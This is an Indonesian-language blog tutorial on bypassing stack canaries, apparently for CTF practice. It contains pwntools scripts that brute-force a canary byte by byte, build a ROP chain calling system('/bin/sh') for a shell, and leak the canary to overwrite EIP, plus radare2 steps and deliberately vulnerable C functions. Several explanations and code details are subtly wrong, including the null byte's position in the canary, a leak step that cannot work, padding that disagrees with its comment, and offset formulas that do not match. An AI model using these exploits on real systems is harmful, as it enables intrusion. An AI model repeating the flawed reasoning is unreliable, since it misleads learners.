<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="1. Apa Itu Bit dan Byte?
Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:

1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
1 Byte = Kumpulan 8 bit (contoh: 01011010).

1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).



Contoh:

00000000 (binary) = 0 (decimal)
11111111 (binary) = 255 (decimal)

Kesimpulan:">
  

  <title>
    
      Bypass Stack Canary - Pwn03
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="1. Apa Itu Bit dan Byte?
Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:

1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
1 Byte = Kumpulan 8 bit (contoh: 01011010).

1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).



Contoh:

00000000 (binary) = 0 (decimal)
11111111 (binary) = 255 (decimal)

Kesimpulan:">
    <meta property="og:description" content="1. Apa Itu Bit dan Byte?
Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:

1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
1 Byte = Kumpulan 8 bit (contoh: 01011010).

1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).



Contoh:

00000000 (binary) = 0 (decimal)
11111111 (binary) = 255 (decimal)

Kesimpulan:">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/stack-canary-bf/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypass Stack Canary - Pwn03">
  <meta name="twitter:description" content="1. Apa Itu Bit dan Byte?
Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:

1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
1 Byte = Kumpulan 8 bit (contoh: 01011010).

1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).



Contoh:

00000000 (binary) = 0 (decimal)
11111111 (binary) = 255 (decimal)

Kesimpulan:">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypass Stack Canary - Pwn03<br><br>
    <small datetime="2025-08-19 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-19 - Rainhynn
    </small>
</h1>

    

    <h2 id="1-apa-itu-bit-dan-byte"><strong>1. Apa Itu Bit dan Byte?</strong></h2>
<p>Sebelum memahami <strong>stack canary</strong>, kita perlu mengerti dasar-dasar <strong>bit</strong> dan <strong>byte</strong>:</p>
<ul>
<li><strong>1 Bit</strong> = Nilai terkecil dalam komputasi (<code>0</code> atau <code>1</code>).</li>
<li><strong>1 Byte</strong> = Kumpulan <strong>8 bit</strong> (contoh: <code>01011010</code>).
<ul>
<li><strong>1 Byte bisa menyimpan nilai dari <code>0</code> sampai <code>255</code></strong> (total <strong>256 kemungkinan</strong>).</li>
<li>Kenapa <strong>256</strong>? Karena <code>2^8 = 256</code> (8 bit = 256 kombinasi).</li>
</ul>
</li>
</ul>
<p>Contoh:</p>
<ul>
<li><code>00000000</code> (binary) = <code>0</code> (decimal)</li>
<li><code>11111111</code> (binary) = <code>255</code> (decimal)</li>
</ul>
<p><strong>Kesimpulan:</strong></p>
<ul>
<li><strong>1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).</strong></li>
<li><strong>Nilai 256 dipakai karena itu batas maksimal 1 byte.</strong></li>
</ul>
<hr>
<h2 id="2-apa-itu-stack-canary"><strong>2. Apa Itu Stack Canary?</strong></h2>
<p><strong>Stack Canary</strong> adalah nilai rahasia (random) di stack yang berfungsi seperti &ldquo;alarm&rdquo; untuk mendeteksi <strong>buffer overflow</strong>.</p>
<ul>
<li>
<p><strong>Ukuran Canary:</strong></p>
<ul>
<li><strong>32-bit program</strong> → Canary = <strong>4 byte</strong> (contoh: <code>0xefbead00</code>)</li>
<li><strong>64-bit program</strong> → Canary = <strong>8 byte</strong> (contoh: <code>0xdeadbeefcafeb00</code>)</li>
</ul>
</li>
<li>
<p><strong>Cara Kerja:</strong></p>
<ul>
<li>Jika ada <strong>buffer overflow</strong>, canary akan <strong>tertimpa</strong> sebelum return address.</li>
<li>Sebelum fungsi selesai (<code>ret</code>), program mengecek apakah canary masih utuh.</li>
<li>Jika <strong>berubah</strong> → Program crash (<code>*** stack smashing detected ***</code>).</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-kenapa-brute-force-canary-menggunakan"><strong>3. Kenapa Brute-Force Canary Menggunakan <code>range(256)</code>?</strong></h2>
<p>Karena <strong>setiap byte canary bisa bernilai <code>0</code> sampai <code>255</code> (total 256 kemungkinan)</strong>, kita perlu mencoba semua kemungkinan byte tersebut.</p>
<h3 id="contoh-brute-force-canary-32-bit"><strong>Contoh Brute-Force Canary (32-bit)</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)  <span style="color:#0f0"># Program 32-bit (canary 4 byte)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;&#34;</span>  <span style="color:#0f0"># Inisialisasi canary kosong</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Brute-force 3 byte pertama (byte ke-4 = \x00)</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">3</span>):  <span style="color:#0f0"># 3 byte pertama</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> byte in range(<span style="color:#f60">256</span>):  <span style="color:#0f0"># Coba semua nilai byte (0-255)</span>
</span></span><span style="display:flex;"><span>        payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span>*offset + canary + bytes([byte])
</span></span><span style="display:flex;"><span>        p.sendline(payload)
</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;stack smashing&#34;</span> not in p.recv():  <span style="color:#0f0"># Jika tidak crash, byte benar</span>
</span></span><span style="display:flex;"><span>            canary += bytes([byte])  <span style="color:#0f0"># Tambahkan byte yang benar</span>
</span></span><span style="display:flex;"><span>            print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Found byte </span><span style="color:#87ceeb">{</span>i+<span style="color:#f60">1</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>hex(byte)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#f00">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Tambahkan null byte terakhir (byte ke-4)</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Full canary: </span><span style="color:#87ceeb">{</span>hex(u32(canary))<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)  <span style="color:#0f0"># Output: 0xefbead00 (misal)</span>
</span></span></code></pre></div><h3 id="penjelasan-kode"><strong>Penjelasan Kode:</strong></h3>
<ol>
<li><strong><code>for byte in range(256)</code></strong>
<ul>
<li>Mencoba <strong>semua nilai byte (0-255)</strong> untuk menemukan byte yang benar.</li>
</ul>
</li>
<li><strong><code>bytes([byte])</code></strong>
<ul>
<li>Mengubah angka (misal <code>255</code>) menjadi byte (<code>\xff</code>).</li>
</ul>
</li>
<li><strong><code>canary += b&quot;\x00&quot;</code></strong>
<ul>
<li>Byte terakhir canary biasanya <code>\x00</code> (null byte), jadi tidak perlu ditebak.</li>
</ul>
</li>
</ol>
<hr>
<h2 id="4-penerapan-brute-force-canary-dalam-exploit"><strong>4. Penerapan Brute-Force Canary dalam Exploit</strong></h2>
<p>Setelah dapat <strong>canary</strong>, kita bisa lanjutkan eksploitasi dengan <strong>Return-Oriented Programming (ROP)</strong> atau <strong>Ret2Libc</strong>.</p>
<h3 id="contoh-payload-setelah-dapat-canary-32-bit"><strong>Contoh Payload Setelah Dapat Canary (32-bit)</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>  <span style="color:#0f0"># Ganti dengan offset yang benar</span>
</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\xef\xbe\xad\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Canary yang sudah ditemukan</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># ROP chain untuk call system(&#34;/bin/sh&#34;)</span>
</span></span><span style="display:flex;"><span>rop = ROP(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
</span></span><span style="display:flex;"><span>rop.call(<span style="color:#87ceeb">&#34;system&#34;</span>, [next(libc.search(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;/bin/sh&#34;</span>))])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload = (
</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * offset +  <span style="color:#0f0"># Isi buffer</span>
</span></span><span style="display:flex;"><span>    canary +         <span style="color:#0f0"># Canary yang benar</span>
</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">12</span> +      <span style="color:#0f0"># Padding (EBP &amp; alignment)</span>
</span></span><span style="display:flex;"><span>    rop.chain()      <span style="color:#0f0"># ROP chain</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.interactive()  <span style="color:#0f0"># Dapat shell!</span>
</span></span></code></pre></div><hr>
<ul>
<li><strong>1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).</strong></li>
<li><strong>Brute-force canary</strong> = Mencoba semua kemungkinan byte (<code>0-255</code>) untuk menemukan nilai canary.</li>
<li><strong>32-bit canary</strong> = 4 byte (3 byte ditebak, 1 byte null).</li>
<li><strong>64-bit canary</strong> = 8 byte (7 byte ditebak, 1 byte null).</li>
<li><strong>Setelah dapat canary</strong>, lanjutkan dengan <strong>ROP/Ret2Libc</strong> untuk bypass NX.</li>
</ul>
<h1 id="beberapa-fungsi-yang-vulnerability">Beberapa fungsi yang vulnerability</h1>
<p>Canary biasanya terlibat ketika ada fungsi <strong>tidak aman</strong> yang membaca input user, seperti:</p>
<table>
  <thead>
      <tr>
          <th>Fungsi</th>
          <th>Deskripsi Risiko</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>gets</code></td>
          <td><strong>Paling berbahaya</strong>, tidak batasi input.</td>
      </tr>
      <tr>
          <td><code>scanf</code></td>
          <td>Bisa overflow jika format <code>%s</code> tanpa batas.</td>
      </tr>
      <tr>
          <td><code>strcpy</code></td>
          <td>Menyalin string tanpa cek panjang.</td>
      </tr>
      <tr>
          <td><code>fgets</code></td>
          <td><strong>Lebih aman</strong>, tapi bisa tetap overflow jika ukuran buffer salah.</td>
      </tr>
      <tr>
          <td><code>read</code></td>
          <td>Bisa overflow jika <code>read(fd, buf, size)</code> dengan <code>size</code> terlalu besar.</td>
      </tr>
  </tbody>
</table>
<h3 id="contoh-fungsi-vulnerable"><strong>Contoh Fungsi Vulnerable</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Contoh 1: gets() (paling mudah di-exploit)
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">gets</span>(buf);  <span style="color:#0f0">// Bisa overflow!
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0">// Contoh 2: fgets() dengan ukuran salah
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln2</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">80</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">fgets</span>(buf, <span style="color:#f60">200</span>, stdin);  <span style="color:#0f0">// Overflow karena size &gt; kapasitas buf
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
</span></span></code></pre></div><hr>
<h2 id="menemukan-posisi-canary-di-stack">Menemukan Posisi Canary di Stack</h2>
<p>selain menggunakan metode brute force, kita bisa menemukan canary
didalam stack, Kita akan menggunakan <strong>radare2</strong> untuk menganalisis binary.</p>
<h3 id="buka-binary-di-r2"><strong>Buka Binary di r2</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>r2 -d ./binary32   <span style="color:#0f0"># Debug binary 32-bit</span>
</span></span><span style="display:flex;"><span>aaa                <span style="color:#0f0"># Analisis semua simbol</span>
</span></span><span style="display:flex;"><span>afl                <span style="color:#0f0"># Lihat daftar fungsi</span>
</span></span><span style="display:flex;"><span>s sym.vuln         <span style="color:#0f0"># masuk ke vuln() example</span>
</span></span></code></pre></div><p>Canary biasanya:</p>
<ul>
<li>Di-load dari <code>gs:0x14</code> (32-bit) atau <code>fs:0x28</code> (64-bit).</li>
<li>Disimpan di stack (biasanya <code>[ebp - 0xc]</code> atau <code>[rbp - 0x8]</code>).</li>
</ul>
<h4 id="contoh-instruksi-canary-di-32-bit"><strong>Contoh Instruksi Canary di 32-bit</strong>:</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>      <span style="color:#0f0">; Load Canary dari GS segment
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">mov</span> [<span style="color:#7fffd4">ebp</span> - <span style="color:#f60">0xc</span>], <span style="color:#7fffd4">eax</span>  <span style="color:#0f0">; Simpan Canary di stack
</span></span></span></code></pre></div><h4 id="contoh-instruksi-canary-di-64-bit"><strong>Contoh Instruksi Canary di 64-bit</strong>:</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#ff0">mov</span> <span style="color:#7fffd4">rax</span>, <span style="color:#7fffd4">qword</span> [<span style="color:#7fffd4">fs</span>:<span style="color:#f60">0x28</span>]  <span style="color:#0f0">; Load Canary dari FS segment
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">mov</span> [<span style="color:#7fffd4">rbp</span> - <span style="color:#f60">0x8</span>], <span style="color:#7fffd4">rax</span>      <span style="color:#0f0">; Simpan Canary di stack
</span></span></span></code></pre></div><h4 id="1-disassembly-fungsi-vulnerable-di-r2"><strong>1. Disassembly Fungsi Vulnerable di r2</strong></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#0f0">; Contoh fungsi vuln() di binary
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>sym.vuln:
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">push</span> <span style="color:#7fffd4">ebp</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">mov</span> <span style="color:#7fffd4">ebp</span>, <span style="color:#7fffd4">esp</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">sub</span> <span style="color:#7fffd4">esp</span>, <span style="color:#f60">0x54</span>       <span style="color:#0f0">; Alokasi 84 byte buffer
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>    <span style="color:#0f0">; Load canary
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">mov</span> [<span style="color:#7fffd4">ebp-0xc</span>], <span style="color:#7fffd4">eax</span>  <span style="color:#0f0">; Simpan canary di [ebp-0xc]
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">lea</span> <span style="color:#7fffd4">eax</span>, [<span style="color:#7fffd4">ebp-0x50</span>] <span style="color:#0f0">; Buffer dimulai di [ebp-0x50]
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ff0">push</span> <span style="color:#7fffd4">eax</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff0">call</span> <span style="color:#7fffd4">gets</span>           <span style="color:#0f0">; Overflow di sini
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#0f0">; ...
</span></span></span></code></pre></div><h4 id="2-penjelasan-layout-stack"><strong>2. Penjelasan Layout Stack</strong></h4>
<pre tabindex="0"><code>| Alamat Stack | Isi                  |
|--------------|----------------------|
| ebp-0x54     | ? (padding)          |
| ebp-0x50     | BUFFER (mulai sini)  |  &lt;-- Buffer overflow dimulai
| ...          | ...                  |
| ebp-0xc      | CANARY               |  &lt;-- Target kita
| ebp-0x8      | Saved EBP            |
| ebp-0x4      | Return Address (EIP) |  &lt;-- Goal akhir
</code></pre><h4 id="3-hitung-offset-ke-canary"><strong>3. Hitung Offset ke Canary</strong></h4>
<ul>
<li><strong>Buffer mulai</strong> di <code>[ebp-0x50]</code> (80 byte dari <code>ebp</code>).</li>
<li><strong>Canary</strong> di <code>[ebp-0xc]</code> (12 byte dari <code>ebp</code>).</li>
<li><strong>Jarak buffer ke canary</strong> = <code>0x50 - 0xc = 0x44</code> (<strong>68 byte</strong>).</li>
</ul>
<hr>
<h3 id="praktek-di-radare2-r2"><strong>Praktek di radare2 (r2)</strong></h3>
<h4 id="1-buka-binary-dan-analisis"><strong>1. Buka Binary dan Analisis</strong></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>r2 -d ./binary32
</span></span><span style="display:flex;"><span>aaa
</span></span><span style="display:flex;"><span>s sym.vuln
</span></span><span style="display:flex;"><span>pdf
</span></span></code></pre></div><h4 id="2-output-contoh-di-r2"><strong>2. Output Contoh di r2</strong></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>┌ 150: <span style="color:#ff0">sym.vuln</span> ()<span style="color:#0f0">;
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           <span style="color:#0f0">; var int32_t var_50h @ ebp-0x50
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           <span style="color:#0f0">; var int32_t var_ch @ ebp-0xc
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804852d</span>      <span style="color:#7fffd4">push</span> <span style="color:#7fffd4">ebp</span>
</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x0804852e</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">ebp</span>, <span style="color:#7fffd4">esp</span>
</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048530</span>      <span style="color:#7fffd4">sub</span> <span style="color:#7fffd4">esp</span>, <span style="color:#f60">0x54</span>
</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048533</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">eax</span>, <span style="color:#7fffd4">gs</span>:<span style="color:#f60">0x14</span>
</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048539</span>      <span style="color:#7fffd4">mov</span> <span style="color:#7fffd4">dword</span> [<span style="color:#7fffd4">var_ch</span>], <span style="color:#7fffd4">eax</span>   <span style="color:#0f0">; [ebp-0xc] = canary
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804853c</span>      <span style="color:#7fffd4">lea</span> <span style="color:#7fffd4">eax</span>, [<span style="color:#7fffd4">var_50h</span>]       <span style="color:#0f0">; [ebp-0x50] = buffer
</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>│           0<span style="color:#ff0">x0804853f</span>      <span style="color:#7fffd4">push</span> <span style="color:#7fffd4">eax</span>
</span></span><span style="display:flex;"><span>│           0<span style="color:#ff0">x08048540</span>      <span style="color:#7fffd4">call</span> <span style="color:#7fffd4">sym.imp.gets</span>        <span style="color:#0f0">; Overflow here
</span></span></span></code></pre></div><h4 id="3-verifikasi-dengan-breakpoint"><strong>3. Verifikasi dengan Breakpoint</strong></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>db sym.vuln     <span style="color:#0f0"># Set breakpoint</span>
</span></span><span style="display:flex;"><span>dc              <span style="color:#0f0"># Run program</span>
</span></span><span style="display:flex;"><span>px @ ebp-0x50   <span style="color:#0f0"># Lihat buffer</span>
</span></span><span style="display:flex;"><span>px @ ebp-0xc    <span style="color:#0f0"># Lihat canary</span>
</span></span></code></pre></div><p>Output:</p>
<pre tabindex="0"><code>[0xffffd110]  00 00 00 00  00 00 00 00  # Buffer (ebp-0x50)
[0xffffd15c]  ef be ad de  00 00 00 00  # Canary (ebp-0xc) = 0xdeadbeef
</code></pre><hr>
<h3 id="eksploitasi-dengan-python"><strong>Eksploitasi dengan Python</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 1: Leak Canary</span>
</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span>            <span style="color:#0f0"># Isi buffer sampai canary (0x44 = 68)</span>
</span></span><span style="display:flex;"><span>p.sendline(payload + <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)  <span style="color:#0f0"># Timpa canary</span>
</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;BBBB&#34;</span>)
</span></span><span style="display:flex;"><span>canary = u32(p.recv(<span style="color:#f60">4</span>))        <span style="color:#0f0"># Baca nilai canary</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Canary: </span><span style="color:#87ceeb">{</span>hex(canary)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Langkah 2: Timpa EIP</span>
</span></span><span style="display:flex;"><span>payload = (
</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * <span style="color:#f60">68</span> +                <span style="color:#0f0"># Jarak buffer ke canary</span>
</span></span><span style="display:flex;"><span>    p32(canary) +              <span style="color:#0f0"># Isi canary asli</span>
</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">8</span> +                 <span style="color:#0f0"># Jarak canary ke EIP (ebp-0xc ke ebp+0x4 = 16 byte)</span>
</span></span><span style="display:flex;"><span>    p32(<span style="color:#f60">0xdeadbeef</span>)            <span style="color:#0f0"># Return address</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>p.sendline(payload)
</span></span><span style="display:flex;"><span>p.interactive()
</span></span></code></pre></div><hr>
<h3 id="faq-singkat"><strong>FAQ Singkat</strong></h3>
<ol>
<li>
<p><strong>Q: Kenapa <code>0x50 - 0xc = 0x44</code>?</strong><br>
<strong>A</strong>: Karena buffer mulai di <code>ebp-0x50</code>, canary di <code>ebp-0xc</code>.<br>
Jarak = <code>0x50 - 0xc = 0x44</code> (68 byte).</p>
</li>
<li>
<p><strong>Q: Gimana kalau <code>sub esp, 0x60</code>?</strong><br>
<strong>A</strong>: Hitung lagi buffer ke canary. Misal:</p>
<ul>
<li>Buffer di <code>[ebp-0x60]</code>, canary di <code>[ebp-0xc]</code> → offset = <code>0x60 - 0xc = 0x54</code> (84 byte).</li>
</ul>
</li>
<li>
<p><strong>Q: Nilai <code>[ebp-0xc]</code> selalu tetap?</strong><br>
<strong>A</strong>: Tidak selalu, tapi umumnya di <code>ebp-0xc</code> (32-bit) atau <code>rbp-0x8</code> (64-bit).<br>
<strong>Selalu cek di r2</strong> dengan <code>px @ ebp-0xc</code>.</p>
</li>
</ol>
<hr>
<h3 id="kesimpulan"><strong>Kesimpulan</strong></h3>
<ul>
<li><strong>Cari <code>sub esp, X</code></strong> → ukuran buffer = <code>X</code>.</li>
<li><strong>Cari <code>[ebp-Y]</code></strong> → lokasi canary (biasanya <code>Y = 0xc</code>).</li>
<li><strong>Offset</strong> = <code>X - Y</code> (dalam hex, konversi ke desimal).</li>
</ul>
<p><strong>Contoh Nyata</strong>:</p>
<ul>
<li><code>sub esp, 0x54</code> + canary di <code>[ebp-0xc]</code> → offset = <code>0x44</code> (68).</li>
<li><code>sub esp, 0x60</code> + canary di <code>[ebp-0xc]</code> → offset = <code>0x54</code> (84).</li>
</ul>
<p>Gampangnya:<br>
<strong>Offset = (Alamat buffer) - (Alamat canary)</strong>.</p>

</article>

<hr>

<p>© 2021-2025 HnvDie</p>
<p>Powered By Hugo ᯓᡣ𐭩</p>



            </div>
        </main>
    </body></html>
